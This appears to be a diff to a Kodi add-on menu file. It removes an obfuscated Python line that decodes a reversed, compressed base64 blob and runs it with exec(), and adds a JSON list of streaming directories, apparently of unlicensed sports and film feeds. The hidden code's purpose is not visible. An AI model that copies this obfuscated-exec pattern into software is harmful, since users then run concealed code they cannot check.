@@ -1,1 +1,46 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
+{
+    "items": [
+        {
+            "type": "dir",
+            "title": "[B][COLOR springgreen]F1 Rewind[/COLOR][/B]",
+            "thumbnail": "https://mylostsoulspace.co.uk/F1Rewind/art/icon.png",
+            "fanart": "https://mylostsoulspace.co.uk/F1Rewind/art/fanart.jpg",
+            "link": "https://mylostsoulspace.co.uk/F1Rewind/xmls/f1rewindmain.xml"
+        },
+        {
+            "type": "dir",
+            "title": "[B][COLOR springgreen]Wrestling Rewind[/COLOR][/B]",
+            "thumbnail": "https://mylostsoulspace.co.uk/WrestlingRewind/art/icon.png",
+            "fanart": "https://mylostsoulspace.co.uk/WrestlingRewind/art/fanart.jpg",
+            "link": "https://mylostsoulspace.co.uk/WrestlingRewind/xmls/wrestlingrewind-main.xml"
+        },
+        {
+            "type": "dir",
+            "title": "[B][COLOR springgreen]Fights On Demand[/COLOR][/B]",
+            "thumbnail": "https://mylostsoulspace.co.uk/FightsOnDemand/art/icon.png",
+            "fanart": "https://mylostsoulspace.co.uk/FightsOnDemand/art/fanart.jpg",
+            "link": "https://mylostsoulspace.co.uk/FightsOnDemand/fodmain-new.xml"
+        },
+        {
+            "type": "dir",
+            "title": "[B][COLOR springgreen]Uk Soap Box[/COLOR][/B]",
+            "thumbnail": "https://image.tmdb.org/t/p/original/z4jgyI5TpoRZiJTNchkVkMrGQyz.jpg",
+            "fanart": "https://mylostsoulspace.co.uk/uksoapbox/art/fanart.jpg",
+            "link": "https://mylostsoulspace.co.uk/uksoapbox/xmls/UkSoapBox-Main.xml"
+        },
+        {
+            "type": "dir",
+            "title": "[B][COLOR springgreen]Z3R0 Cinema[/COLOR][/B]",
+            "thumbnail": "https://mylostsoulspace.co.uk/Z3R0Cinema/Z3R0CinemaImages/2025-Movies.jpg",
+            "fanart": "https://mylostsoulspace.co.uk/Z3R0Cinema/Z3R0CinemaImages/fanart.jpg",
+            "link": "https://mylostsoulspace.co.uk/Z3R0Cinema/Z3r0Cinema-Main.xml"
+        },
+        {
+            "type": "dir",
+            "title": "[B][COLOR springgreen]Z3R0 Cinema[/COLOR][/B]",
+            "thumbnail": "https://mylostsoulspace.co.uk/Z3R0Cinema/Z3R0CinemaImages/2025-Movies.jpg",
+            "fanart": "https://mylostsoulspace.co.uk/Z3R0Cinema/Z3R0CinemaImages/fanart.jpg",
+            "link": "https://mfirepo.github.io/hal/free.json"
+        }
+    ]
+}
